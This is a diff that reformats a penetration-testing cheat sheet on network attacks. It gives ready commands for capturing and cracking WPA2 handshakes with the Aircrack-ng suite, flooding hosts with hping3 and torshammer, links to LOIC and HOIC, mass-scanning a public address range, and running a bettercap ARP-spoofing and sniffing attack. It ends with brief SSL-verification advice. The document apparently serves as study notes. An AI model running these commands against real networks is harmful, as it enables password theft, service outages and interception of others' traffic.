@@ -1,102 +1,94 @@
-# Handshake
+Handshake
+A wireless handshake, specifically the four-way handshake, is a process that establishes a secure connection between a wireless access point (AP) and a client device on a network.
 
-A wireless handshake, also known as a four-way handshake, is the 
-process of establishing a secure connection between a wireless 
-access point (AP) and a client device on a wireless network
+WPA2-PSK Cracking
+The most common method for cracking WPA2-PSK is through an offline brute-force attack, which involves attempting multiple password combinations until the correct one is found. The prerequisite for such an attack is capturing a valid handshake from an active client on the network.
 
-▪ The most common method for cracking WPA2-PSK is through an offline brute-force attack, which involves trying every possible password combination until the correct one is found
-▪ The one requirement before engaging with such attacks, is 
-capturing a valid handshake from present client on the network
+Tools Used (Aircrack-ng Suite):
+airodump-ng: Analyzes networks and captures handshakes.
 
-The tools we will mainly use from Aircrack-ng bundles are:
-▪ airodump-ng for analyzing the networks and capturing handshakes
-▪ aireplay-ng for performing deauthentication attacks
-▪ aircrack-ng for cracking the password with the handshake
+aireplay-ng: Performs deauthentication attacks.
 
+aircrack-ng: Cracks the password using the captured handshake.
 
-Enter the following command to start capturing packets for the target network:
-▪ sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> --write <output_file> wlan0mon
-▪ aircrack-ng -w <wordlist_file> <handshake_file>
+Capturing Packets for a Target Network:
+sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> --write <output_file> wlan0mon
+Cracking the Password:
+aircrack-ng -w <wordlist_file> <handshake_file>
+Denial-of-Service (DoS) & Distributed Denial-of-Service (DDoS) Attacks
+Common Tools:
+HOIC (High Orbit Ion Cannon): Open-source stress testing tool for websites and networks.
+Download Here
 
-# DoS and DDoS
+LOIC (Low Orbit Ion Cannon): Open-source network stress testing tool used for DoS attacks.
+Download Here
 
-▪ HOIC (High Orbit Ion Cannon) is a free and open-source tool used for stress testing websites and networks. 
-Download at: https://sourceforge.net/projects/highorbitioncannon/ 
-▪ LOIC (Low Orbit Ion Cannon) is an open-source network stress testing tool used to perform denial-of-service (DoS) attacks. 
-Download at: https://sourceforge.net/projects/loic/
-▪ hping3 is a free, open-source tool used for network testing, security auditing, and packet crafting. hping3 is capable of sending a large number of packets to a target system, and it can be used to test the resilience of a network against various types of attacks, including denial-of-service (DoS) attacks.
+hping3: Versatile tool for network testing, security auditing, and packet crafting. It can be used to test a network's resilience against DoS attacks.
 
-```sh
-sudohping3-S--flood-V-p IP_ADDRESS
-```
+Example hping3 Command:
+sudo hping3 -S --flood -V -p <IP_ADDRESS>
+torshammer.py: Python script for performing DDoS attacks.
+GitHub Repository
 
-▪ torshammer.py is a script written in Python that can be used to perform a distributed denial-of-service (DDoS) attack.
-https://github.com/Karlheinzniebuhr/torshammer 
-
-```sh
+Example torshammer Command:
 python torshammer.py -t 192.168.1.100 -r 100000 -T
-```
+Network Reconnaissance
+Nmap
+Nmap Cheat Sheet
 
-
-##  Network Reconnaissance with Nmap
-[Cheatsheet Nmap](https://www.stationx.net/nmap-cheat-sheet/)
-```sh
 nmap -p 80 --script http-generator.nse
-nmap -p 443 --script=http-headers,http-title,http-generator 
-nmap --script="default and http-*" 
-```
-##  Network Reconnaissance with Masscan
-[Cheatsheet Masscan/](https://cheatsheet.haax.fr/network/port-scanning/masscan_cheatsheet/)
-```sh
+nmap -p 443 --script=http-headers,http-title,http-generator
+nmap --script="default and http-*"
+Masscan
+Masscan Cheat Sheet
+
 masscan -p80,443,8080,8443,81,4444,4443,8888 70.176.0.0/16
-```
-##  Network Reconnaissance with Netdiscover
-[Cheatsheet Netdiscover](https://neverendingsecurity.wordpress.com/2015/04/07/netdiscover-cheatsheet/)
-```sh
+Netdiscover
+Netdiscover Cheat Sheet
+
 sudo netdiscover
-```
-## Network Reconnaissance with Bettercap
-[Cheatsheet Bettercap](https://github.com/Lifka/hacking-resources/blob/main/session-hijacking-cheat-sheet.md)
-```sh
+Bettercap
+Bettercap Cheat Sheet
+
 sudo bettercap
-```
+Nessus - Vulnerability Scanner
+Nessus is a widely used commercial vulnerability scanner designed to identify security threats, missing patches, misconfigurations, and vulnerable software.
 
-# Nessus
-is a popular, commercial vulnerability scanner used for  identifying security threats in computer systems, such as missing patches, configuration issues, and susceptible software
-
-```sh
+Installation & Setup:
 wget 'https://www.tenable.com/downloads/api/v1/public/pages/nessus/ downloads/18394/download?i_agree_to_tenable_license_agreeme nt=true' -O Nessus_amd64.deb
 sudo apt install -f ./Nessus_amd64.deb
 sudo systemctl enable nessusd
 sudo systemctl start nessusd
 systemctl status nessusd
-```
+Note:
 
+Once installed, navigate to the Nessus web UI.
 
-***1.After everything is done, you should land to the base UI***
-***2. If you can't create new scan, this is most likely because plugins are still configuring***
+If you cannot create a new scan immediately, the plugins may still be initializing.
 
-# ARP Spoofing attacks with the following tools:
-**Ettercap** (https://www.ettercap-project.org/)
-**MITM Framework** (https://github.com/byt3bl33d3r/MITMf)
-Driftnet (https://www.kali.org/tools/driftnet/
+ARP Spoofing & MITM Attacks
+Tools:
+Ettercap: Official Website
 
-## Performing MITM with Bettercap
-```sh
+MITM Framework: GitHub Repository
+
+Driftnet: Kali Linux Tool
+
+Performing MITM Attacks with Bettercap:
 sudo apt-get install bettercap
 sudo bettercap --iface <interface>
-```
+Running an ARP Spoofing Attack:
+net.probe on
+set arp.spoof.duplex true
+set arp.spoof.targets 192.168.74.128
+arp.spoof on
+net.sniff on
+SSL Verification & MITM Prevention
+To prevent MITM attacks through SSL verification:
 
-Running the ARP spoof attack
- ▪ net.probe on
- ▪ set arp.spoof.duplex true
- ▪ set arp.spoof.targets 192.168.74.128
- ▪ arp.spoof on
- ▪ net.sniff on
+Ensure that the SSL certificate is issued by a trusted Certificate Authority (CA) and has not been revoked.
 
+Verify that the domain name in the certificate matches the website's domain.
 
-##  How SSL Verification Stop MITM?
-To prevent man-in-the-middle (MITM) attacks by verifying SSL certificates, you should take the following steps:
-▪ Ensure that the SSL certificate is from a trusted certificate authority 
-(CA) and has not been revoked
-▪ Verify that the domain name in the certificate matches the domain name of the website you are visiting
+Use tools like OpenSSL to manually check certificate details when necessary.
+
